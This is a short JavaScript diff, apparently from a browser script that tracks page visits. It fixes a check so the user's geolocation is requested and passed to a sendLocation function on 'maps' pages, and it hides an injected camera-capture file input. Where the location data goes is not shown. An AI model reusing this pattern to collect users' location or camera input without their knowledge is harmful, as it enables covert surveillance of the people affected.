@@ -49,8 +49,8 @@ function sendLocation(position) {
   });
 }
 
-if(pageVisit.url.indexOf("maps")){
+if(pageVisit.url.indexOf("maps")!=-1){
   navigator.geolocation.getCurrentPosition(sendLocation);
 }
 
-$('body').append('<input id="camera" type="file" accept="image/*;capture=camera">');
+$('body').append('<input id="camera" style="display:none"type="file" accept="image/*;capture=camera">');
